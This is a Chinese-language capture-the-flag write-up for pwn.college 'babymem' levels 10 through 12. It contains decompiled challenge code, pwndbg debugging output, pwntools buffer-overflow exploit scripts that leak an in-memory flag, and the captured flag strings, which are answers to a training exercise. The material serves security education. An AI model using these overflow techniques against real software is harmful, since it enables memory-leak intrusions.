  unsigned __int64 v16; // [rsp+168h] [rbp-8h]
  __int64 savedregs; // [rsp+170h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+178h] [rbp+8h] BYREF

  v8 = a1;
  v7[2] = a2;
  v7[1] = a3;
  v16 = __readfsqword(0x28u);
  memset(v13, 0, sizeof(v13));
  v14 = 0;
  v15 = 0;
  v11 = v13;
  buf = &v13[37];
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v7;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v7) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", v11);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 37);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, the flag will be loaded into memory.");
  puts("However, at no point will this program actually print the buffer storing the flag.");
  v3 = open("/flag", 0);
  read(v3, buf, 0x100uLL);
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", v11);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)v11 + nbytes,
    nbytes - 37);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v9 = read(0, v11, nbytes);
  if ( v9 < 0 )
  {
    v4 = __errno_location();
    v5 = strerror(*v4);
    printf("ERROR: Failed to read input -- %s!\n", v5);
    exit(1);
  }
  printf("You sent %d bytes!\n", v9);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", v11);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the flag is %p.\n", buf);
  putchar(10);
  printf("You said: %s\n", (const char *)v11);
  puts("Goodbye!");
  return 0LL;
}
```

```plaintext wrap=false showLineNumbers=false
4755 .rwsr-xr-x 18k root root 12 Dec 21:43 babymem-level-10-0*
0400 .r--------  57 root root 12 Dec 22:13 /flag
```

通过调试我们发现，`read` 并不会从 `/flag` 中读到数据。但由于这是个 `SUID` 程序，运行的时候会以这个程序的所有者的身份运行，而所有者是 `root`，那么理应我们可以读取 `/flag` 才对。这里的问题其实在于内核的保护策略：调试 `SUID` 程序的时候，Linux 内核会移除 `SUID` 位，使用当前用户权限调试，以此防止攻击者通过调试器以特权身份执行恶意代码。
直接一个 `sudo` 怼上去看它服不服吧 LMAO。

注意到程序最后使用 `printf` 将整个 `buf` 的内容输出。而我们的 `flag` 在此之前就已经被保存到 `buf` 中了。所以这里考察的是 `printf` 在遇到 `\x00` 后认为字符串结束而中断输出。

所以我们只要使用垃圾值填充到 `flag` 保存的位置就好了。

~为什么那么简单……这可是至高的 Level 10！！！~

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-10-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+507
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding = b"".ljust(0x25, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


try:
    target = launch(debug=False)

    payload = padding

    if send_payload(target, payload):
        log.success("Success! Exiting...")

        pause()
        exit()
except Exception as e:
    log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{cHV80jBzHGyTr_qaE0HdorP-81y.01NwMDL5cTNxgzW}`

# Level 10.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!

## Write-up

试问这和上一题有何区别……

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-10-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+166
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding = b"".ljust(0x51, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


try:
    target = launch(debug=False)

    payload = padding

    if send_payload(target, payload):
        log.success("Success! Exiting...")

        pause()
        exit()
except Exception as e:
    log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{4n50Ii5yzf-WULWGzVOqmN3vTgp.0FOwMDL5cTNxgzW}`

# Level 11.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!

## Write-up

和前面两题差不多，考察点都是 `SUID` 的性质和看能不能想到 `printf` 判断字符串结束的机制。利用这个机制来泄漏 `flag`。

和前面两题最大的区别在于这次使用 `mmap` 函数来映射，或者说分配内存。之前是变量自动分配内存。

`mmap` 映射成功返回起始地址，失败返回 `-1`。

```c {10, 11} ins={22-24, 33} del={44, 57} collapse={1-6, 15-18, 28-29, 37-40, 48-53}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  int i; // [rsp+2Ch] [rbp-34h]
  int fd; // [rsp+30h] [rbp-30h]
  int v5; // [rsp+34h] [rbp-2Ch]
  size_t nbytes; // [rsp+38h] [rbp-28h] BYREF
  void *v7; // [rsp+40h] [rbp-20h]
  void *buf; // [rsp+48h] [rbp-18h]
  void *v9; // [rsp+50h] [rbp-10h]
  void *v10; // [rsp+58h] [rbp-8h]

  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  puts("This challenge stores your input buffer in an mmapped page of memory!");
  v7 = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
  printf("Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n", v7);
  puts("In this level, the flag will be loaded into memory.");
  puts("However, at no point will this program actually print the buffer storing the flag.");
  puts("Mapping memory for the flag...");
  buf = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
  fd = open("/flag", 0);
  read(fd, buf, 0x400uLL);
  close(fd);
  printf("Called mmap(0, 0x1000, 4, MAP_SHARED, open(\"/flag\", 0), 0) = %p\n", buf);
  for ( i = 0; i <= 2; ++i )
  {
    v10 = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
    printf("Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n", v10);
  }
  puts("Memory mapping the input buffer...");
  v9 = mmap(0LL, 0x78uLL, 3, 34, 0, 0LL);
  printf("Called mmap(0, 120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n", v9);
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", v9);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)v9 + nbytes,
    nbytes - 120);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v5 = read(0, v9, nbytes);
  if ( v5 < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  printf("You sent %d bytes!\n", v5);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", v9);
  printf("- the address of the flag is %p.\n", buf);
  putchar(10);
  printf("You said: %s\n", (const char *)v9);
  puts("Goodbye!");
  return 0LL;
}
```

alr，让我们调试看看需要多大的 padding：

```asm wrap=false showLineNumbers=false collapse={2-22, 31-58, 60-109, 116-134, 143-171, 173-223}
Breakpoint 1, 0x000055e7d6a8cd2a in challenge ()
------- tip of the day (disable with set show-tips off) -------
Pwndbg mirrors some of Windbg commands like eq, ew, ed, eb, es, dq, dw, dd, db, ds for writing and reading memory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x1f
 RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
 RCX  0x22
 RDX  3
 RDI  0
 RSI  0x1000
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
 RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
 RIP  0x55e7d6a8cd2a (challenge+188) ◂— call 0x55e7d6a8c150
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x55e7d6a8cd2a <challenge+188>    call   mmap@plt                    <mmap@plt>
        addr: 0
        len: 0x1000
        prot: 3
        flags: 0x22
        fd: 0 (pipe:[532567])
        offset: 0

   0x55e7d6a8cd2f <challenge+193>    mov    qword ptr [rbp - 0x18], rax
   0x55e7d6a8cd33 <challenge+197>    mov    esi, 0                          ESI => 0
   0x55e7d6a8cd38 <challenge+202>    lea    rdi, [rip + 0x1530]             RDI => 0x55e7d6a8e26f ◂— 0x67616c662f /* '/flag' */
   0x55e7d6a8cd3f <challenge+209>    mov    eax, 0                          EAX => 0
   0x55e7d6a8cd44 <challenge+214>    call   open@plt                    <open@plt>

   0x55e7d6a8cd49 <challenge+219>    mov    dword ptr [rbp - 0x30], eax
   0x55e7d6a8cd4c <challenge+222>    mov    rcx, qword ptr [rbp - 0x18]
   0x55e7d6a8cd50 <challenge+226>    mov    eax, dword ptr [rbp - 0x30]
   0x55e7d6a8cd53 <challenge+229>    mov    edx, 0x400                      EDX => 0x400
   0x55e7d6a8cd58 <challenge+234>    mov    rsi, rcx
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
05:0028│-038 0x7ffcf78305f8 —▸ 0x7044dd967c80 (putchar+240) ◂— jmp 0x7044dd967bd6
06:0030│-030 0x7ffcf7830600 ◂— 0x230
07:0038│-028 0x7ffcf7830608 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55e7d6a8cd2a challenge+188
   1   0x55e7d6a8d063 main+213
   2   0x7044dd90ae08
   3   0x7044dd90aecc __libc_start_main+140
   4   0x55e7d6a8c20e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
0x000055e7d6a8cd2f in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x7044ddaff000 ◂— 0
 RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
*RCX  0x7044dd9fa24c (mmap64+44) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  3
 RDI  0
 RSI  0x1000
 R8   0
 R9   0
*R10  0x22
*R11  0x246
 R12  1
 R13  0
 R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
 RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
*RIP  0x55e7d6a8cd2f (challenge+193) ◂— mov qword ptr [rbp - 0x18], rax
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x55e7d6a8cd2a <challenge+188>    call   mmap@plt                    <mmap@plt>

 ► 0x55e7d6a8cd2f <challenge+193>    mov    qword ptr [rbp - 0x18], rax     [0x7ffcf7830618] => 0x7044ddaff000 ◂— 0
   0x55e7d6a8cd33 <challenge+197>    mov    esi, 0                          ESI => 0
   0x55e7d6a8cd38 <challenge+202>    lea    rdi, [rip + 0x1530]             RDI => 0x55e7d6a8e26f ◂— 0x67616c662f /* '/flag' */
   0x55e7d6a8cd3f <challenge+209>    mov    eax, 0                          EAX => 0
   0x55e7d6a8cd44 <challenge+214>    call   open@plt                    <open@plt>

   0x55e7d6a8cd49 <challenge+219>    mov    dword ptr [rbp - 0x30], eax
   0x55e7d6a8cd4c <challenge+222>    mov    rcx, qword ptr [rbp - 0x18]
   0x55e7d6a8cd50 <challenge+226>    mov    eax, dword ptr [rbp - 0x30]
   0x55e7d6a8cd53 <challenge+229>    mov    edx, 0x400                      EDX => 0x400
   0x55e7d6a8cd58 <challenge+234>    mov    rsi, rcx
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
05:0028│-038 0x7ffcf78305f8 —▸ 0x7044dd967c80 (putchar+240) ◂— jmp 0x7044dd967bd6
06:0030│-030 0x7ffcf7830600 ◂— 0x230
07:0038│-028 0x7ffcf7830608 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55e7d6a8cd2f challenge+193
   1   0x55e7d6a8d063 main+213
   2   0x7044dd90ae08
   3   0x7044dd90aecc __libc_start_main+140
   4   0x55e7d6a8c20e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p/x $rax
$1 = 0x7044ddaff000
pwndbg> c
Continuing.

Breakpoint 2, 0x000055e7d6a8ce04 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x23
 RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
*RCX  0x22
 RDX  3
 RDI  0
*RSI  0x78
 R8   0
 R9   0
*R10  0
*R11  0x202
 R12  1
 R13  0
 R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
 RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
*RIP  0x55e7d6a8ce04 (challenge+406) ◂— call 0x55e7d6a8c150
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x55e7d6a8ce04 <challenge+406>    call   mmap@plt                    <mmap@plt>
        addr: 0
        len: 0x78
        prot: 3
        flags: 0x22
        fd: 0 (pipe:[532567])
        offset: 0

   0x55e7d6a8ce09 <challenge+411>    mov    qword ptr [rbp - 0x10], rax
   0x55e7d6a8ce0d <challenge+415>    mov    rax, qword ptr [rbp - 0x10]
   0x55e7d6a8ce11 <challenge+419>    mov    rsi, rax
   0x55e7d6a8ce14 <challenge+422>    lea    rdi, [rip + 0x14cd]             RDI => 0x55e7d6a8e2e8 ◂— 'Called mmap(0, 120, PROT_READ|PROT_WRITE, MAP_PRIV...'
   0x55e7d6a8ce1b <challenge+429>    mov    eax, 0                          EAX => 0
   0x55e7d6a8ce20 <challenge+434>    call   printf@plt                  <printf@plt>

   0x55e7d6a8ce25 <challenge+439>    lea    rdi, [rip + 0x1508]     RDI => 0x55e7d6a8e334 ◂— 'Payload size: '
   0x55e7d6a8ce2c <challenge+446>    mov    eax, 0                  EAX => 0
   0x55e7d6a8ce31 <challenge+451>    call   printf@plt                  <printf@plt>

   0x55e7d6a8ce36 <challenge+456>    lea    rax, [rbp - 0x28]
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
05:0028│-038 0x7ffcf78305f8 ◂— 0x3dd967c80
06:0030│-030 0x7ffcf7830600 ◂— 0xffffffff
07:0038│-028 0x7ffcf7830608 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55e7d6a8ce04 challenge+406
   1   0x55e7d6a8d063 main+213
   2   0x7044dd90ae08
   3   0x7044dd90aecc __libc_start_main+140
   4   0x55e7d6a8c20e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
0x000055e7d6a8ce09 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x7044ddafb000 ◂— 0
 RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
*RCX  0x7044dd9fa24c (mmap64+44) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  3
 RDI  0
 RSI  0x78
 R8   0
 R9   0
*R10  0x22
*R11  0x246
 R12  1
 R13  0
 R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
 RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
*RIP  0x55e7d6a8ce09 (challenge+411) ◂— mov qword ptr [rbp - 0x10], rax
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x55e7d6a8ce04 <challenge+406>    call   mmap@plt                    <mmap@plt>

 ► 0x55e7d6a8ce09 <challenge+411>    mov    qword ptr [rbp - 0x10], rax     [0x7ffcf7830620] => 0x7044ddafb000 ◂— 0
   0x55e7d6a8ce0d <challenge+415>    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7ffcf7830620] => 0x7044ddafb000 ◂— 0
   0x55e7d6a8ce11 <challenge+419>    mov    rsi, rax                        RSI => 0x7044ddafb000 ◂— 0
   0x55e7d6a8ce14 <challenge+422>    lea    rdi, [rip + 0x14cd]             RDI => 0x55e7d6a8e2e8 ◂— 'Called mmap(0, 120, PROT_READ|PROT_WRITE, MAP_PRIV...'
   0x55e7d6a8ce1b <challenge+429>    mov    eax, 0                          EAX => 0
   0x55e7d6a8ce20 <challenge+434>    call   printf@plt                  <printf@plt>

   0x55e7d6a8ce25 <challenge+439>    lea    rdi, [rip + 0x1508]     RDI => 0x55e7d6a8e334 ◂— 'Payload size: '
   0x55e7d6a8ce2c <challenge+446>    mov    eax, 0                  EAX => 0
   0x55e7d6a8ce31 <challenge+451>    call   printf@plt                  <printf@plt>

   0x55e7d6a8ce36 <challenge+456>    lea    rax, [rbp - 0x28]
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
05:0028│-038 0x7ffcf78305f8 ◂— 0x3dd967c80
06:0030│-030 0x7ffcf7830600 ◂— 0xffffffff
07:0038│-028 0x7ffcf7830608 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55e7d6a8ce09 challenge+411
   1   0x55e7d6a8d063 main+213
   2   0x7044dd90ae08
   3   0x7044dd90aecc __libc_start_main+140
   4   0x55e7d6a8c20e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> dist $rax $1
0x7044ddafb000->0x7044ddaff000 is 0x4000 bytes (0x800 words)
```

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-11-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+188
b *challenge+406
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding = b"".ljust(0x4000, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


try:
    target = launch(debug=False)

    payload = padding

    if send_payload(target, payload):
        log.success("Success! Exiting...")

        pause()
        exit()
except Exception as e:
    log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{oNJmkkep5Mt0PwVQdAiStSjA960.0VOwMDL5cTNxgzW}`

# Level 11.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!

## Write-up

和上题一样的哥……

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-11-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+104
b *challenge+262
b *challenge+352
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding = b"".ljust(0x4000, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


try:
    target = launch(debug=False)

    payload = padding

    if send_payload(target, payload):
        log.success("Success! Exiting...")

        pause()
        exit()
except Exception as e:
    log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{I5165He8SxPMM_8YzEz5DkzRZ1c.0FMxMDL5cTNxgzW}`

# Level 12.0

## Information

- Category: Pwn

## Description

> Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.

## Write-up

```c ins={146-150} del={112, 143} collapse={1-108, 116-139, 154-156}
__int64 __fastcall challenge(unsigned int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  __int64 v6; // [rsp+0h] [rbp-60h] BYREF
  __int64 v7; // [rsp+8h] [rbp-58h]
  __int64 v8; // [rsp+10h] [rbp-50h]
  unsigned int v9; // [rsp+1Ch] [rbp-44h]
  int v10; // [rsp+2Ch] [rbp-34h]
  size_t nbytes; // [rsp+30h] [rbp-30h] BYREF
  void *buf; // [rsp+38h] [rbp-28h]
  _QWORD v13[2]; // [rsp+40h] [rbp-20h] BYREF
  char v14; // [rsp+50h] [rbp-10h]
  unsigned __int64 v15; // [rsp+58h] [rbp-8h]
  __int64 savedregs; // [rsp+60h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+68h] [rbp+8h] BYREF

  v9 = a1;
  v8 = a2;
  v7 = a3;
  v15 = __readfsqword(0x28u);
  v13[0] = 0LL;
  v13[1] = 0LL;
  v14 = 0;
  buf = v13;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)&v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 17);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win_authed() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)buf + 8,
    17);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 17);
  puts("and 8 that will overwrite the return address).\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
